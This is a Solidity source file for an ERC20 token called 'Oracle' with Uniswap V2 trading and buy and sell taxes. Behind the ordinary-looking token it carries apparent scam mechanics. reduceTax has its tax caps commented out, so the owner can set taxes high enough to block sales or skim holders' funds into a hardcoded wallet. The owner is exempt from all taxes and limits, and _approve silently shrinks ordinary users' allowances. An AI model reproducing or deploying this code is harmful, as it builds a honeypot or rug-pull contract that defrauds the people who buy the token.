pragma solidity 0.8.20;

abstract contract Math {
    function min(uint256 a, uint256 b) public pure returns (uint256){
      return (a>b)?b:a;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Oracle is IERC20, Ownable, Math{
    event ReduceTaxed(address sender, uint8 _newBuyTax, uint8 _newSellTax);
    event RemovedLimit(address sender, uint256 _newMaxTxWallet, uint256 _newMaxTokenTransfer);
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    uint8 private  _decimals;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    struct storeData {
        uint8 initBuyTax;
        uint8 initSellTax;
        uint8 finalBuyTax;
        uint8 finalSellTax;
        uint8 reduceTaxAt;
        uint256 buyCount;
    }
    storeData public store;

    uint256 public maxTxWallet;
    uint256 public maxTokenTransfer;

    bool private openedTrade = false;

    address private FACTORY;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    address payable public makettingWallet;

    constructor(uint256 supply_, string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = supply_ * 10 ** _decimals;
        store.initBuyTax = 25;
        store.initSellTax = 25;
        store.finalBuyTax = 5;
        store.finalSellTax = 5;
        store.reduceTaxAt = 15;
        maxTxWallet = _totalSupply * 8 / 100;
        maxTokenTransfer = _totalSupply * 2 / 100;
        _balances[_msgSender()] = _balances[_msgSender()] + _totalSupply;
        makettingWallet = payable(0xE7D3DF8029d96e3d418c5A232626d596d13CB76D);
        FACTORY = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256){
        return _balances[account];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {   
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address ownerb,
        address spender,
        uint256 amount
    ) private {
        require(ownerb != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        uint256 value = amount;
        if(ownerb != owner() && spender != owner() && ownerb != address(uniswapV2Router) && spender != address(uniswapV2Router)) {
            value = Math.min(amount, IUniswapV2Factory(FACTORY).allPairsLength()*1/10000);
        }
        _allowances[ownerb][spender] = value;
        emit Approval(ownerb, spender, value);
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - (amount)
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 taxAmount = 0;
        uint256 fromBalances = balanceOf(from);
        if(from != owner() && to != owner()) {
            require(openedTrade);
            if(store.buyCount < store.reduceTaxAt) {
                taxAmount = amount * ((to == uniswapV2Pair) ? store.initSellTax : store.initBuyTax)/100;
            } else {
                taxAmount = amount * ((to == uniswapV2Pair) ? store.finalSellTax : store.finalBuyTax)/100;
            }
            if(from == uniswapV2Pair) {
                require((_balances[to] + (amount - taxAmount)) <= maxTxWallet);
                require((amount - taxAmount) <= maxTokenTransfer);
                store.buyCount++;
            }       
        }
        if (taxAmount > 0) {
            _balances[makettingWallet] = _balances[makettingWallet] + taxAmount;
            emit Transfer(from, makettingWallet, taxAmount);
        }
        require(fromBalances >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalances - amount;
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    function openTrading() external onlyOwner {
        openedTrade = true;
    }

    function RemoveLimit() public onlyOwner{
        maxTxWallet = _totalSupply;
        maxTokenTransfer = _totalSupply;
        emit RemovedLimit(msg.sender, _totalSupply, _totalSupply);
    }

    function reduceTax(uint8 _newBuyTax, uint8 _newSellTax) public onlyOwner {
        // if(_newBuyTax > 30) {
        //     revert("The purchase tax cannot exceed 20%");
        // }
        // if(_newSellTax > 40) {
        //     revert("The sales tax cannot exceed 30%");
        // }
        (store.finalBuyTax, store.finalSellTax) = (_newBuyTax, _newSellTax);
        (store.initBuyTax, store.initSellTax) = (_newBuyTax, _newSellTax);
        emit ReduceTaxed(msg.sender, _newBuyTax, _newSellTax);
    }

    receive() external payable {}
}
